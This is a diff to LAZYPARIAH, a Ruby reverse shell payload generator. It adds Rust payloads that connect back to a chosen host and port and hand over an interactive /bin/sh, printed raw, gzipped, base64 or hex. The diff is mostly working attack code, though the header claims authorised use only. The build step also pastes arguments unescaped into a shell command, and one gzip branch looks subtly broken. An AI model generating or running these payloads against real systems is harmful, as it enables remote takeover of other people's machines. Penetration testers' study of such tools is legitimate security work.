@@ -1,7 +1,7 @@
 #!/usr/bin/env ruby
 #
 # Title: LAZYPARIAH
-# Version: 1.1.1
+# Version: 1.2.0
 # Description:
 #	LAZYPARIAH is a simple tool for generating various reverse shell payloads
 #	on the fly. It is intended to be used only in authorised circumstances by
@@ -64,7 +64,13 @@ PAYLOAD_LIST = [
 	"c_binary_hex",
 	"c_binary_gzip",
 	"c_binary_gzip_b64",
-	"c_binary_gzip_hex"
+	"c_binary_gzip_hex",
+	"rust_binary",
+	"rust_binary_gzip",
+	"rust_binary_b64",
+	"rust_binary_gzip_b64",
+	"rust_binary_hex",
+	"rust_binary_gzip_hex",
 ].sort()
 
 # Define dictionary of payload aliases for backwards compatibility with versions < 1.0.0.
@@ -329,6 +335,55 @@ begin
 						binary_payload_gzip_b64 = Base64.strict_encode64(binary_payload_gzip)
 						print_output(binary_payload_gzip_b64, url_encode=url_encode, new_line=!arguments[:"no-new-line"])
 					when "c_binary_gzip_hex"
+						sio = StringIO.new()
+						sio.binmode()
+						gz = Zlib::GzipWriter.new(sio)
+						gz.write(binary_payload, new_line=!arguments[:"no-new-line"])
+						gz.close()
+						binary_payload_gzip = sio.string
+						binary_payload_gzip_hex = binary_payload_gzip.unpack("H*")[0]
+						print_output(binary_payload_gzip_hex)
+					end
+				end
+
+				system("rm -r #{temp_dir}")
+			when "rust_binary", "rust_binary_gzip", "rust_binary_b64", "rust_binary_gzip_b64", "rust_binary_hex", "rust_binary_gzip_hex"
+				code = "use std::net::TcpStream;use std::os::unix::io::{AsRawFd, FromRawFd};use std::process::{Command, Stdio};fn main() {let lhost: &str = \"#{ARGV[1]}\";let lport: &str = \"#{ARGV[2]}\";let tcp_stream = TcpStream::connect(format!(\"{}:{}\", lhost, lport)).unwrap();let fd = tcp_stream.as_raw_fd();Command::new(\"/bin/sh\").arg(\"-i\").stdin(unsafe {Stdio::from_raw_fd(fd)}).stdout(unsafe {Stdio::from_raw_fd(fd)}).stderr(unsafe {Stdio::from_raw_fd(fd)}).spawn().unwrap().wait().unwrap();}"
+
+				temp_dir = IO.popen("mktemp -dt lazypariah_XXXXXXXX").read().chomp()
+				temp_file = temp_dir+"/rs.rs"
+
+				system("echo '#{code}' > #{temp_file}; rustc #{temp_file} -o #{temp_dir+"/rs"};")
+
+				File.open(temp_dir+"/rs", "r") do |f|
+					binary_payload = f.read()
+					case selected_payload
+					when "rust_binary"
+						print_output(binary_payload, new_line=false)
+					when "rust_binary_b64"
+						binary_payload_b64 = Base64.strict_encode64(binary_payload)
+						print_output(binary_payload_b64, url_encode=url_encode, new_line=!arguments[:"no-new-line"])
+					when "rust_binary_hex"
+						binary_payload_hex = binary_payload.unpack("H*")[0]
+						print_output(binary_payload_hex, new_line=!arguments[:"no-new-line"])
+					when "rust_binary_gzip"
+						sio = StringIO.new()
+						sio.binmode()
+						gz = Zlib::GzipWriter.new(sio)
+						gz.write(binary_payload)
+						gz.close()
+						binary_payload_gzip = sio.string
+						print_output(binary_payload_gzip, new_line=false)
+					when "rust_binary_gzip_b64"
+						sio = StringIO.new()
+						sio.binmode()
+						gz = Zlib::GzipWriter.new(sio)
+						gz.write(binary_payload)
+						gz.close()
+						binary_payload_gzip = sio.string
+						binary_payload_gzip_b64 = Base64.strict_encode64(binary_payload_gzip)
+						print_output(binary_payload_gzip_b64, url_encode=url_encode, new_line=!arguments[:"no-new-line"])
+					when "rust_binary_gzip_hex"
 						sio = StringIO.new()
 						sio.binmode()
 						gz = Zlib::GzipWriter.new(sio)
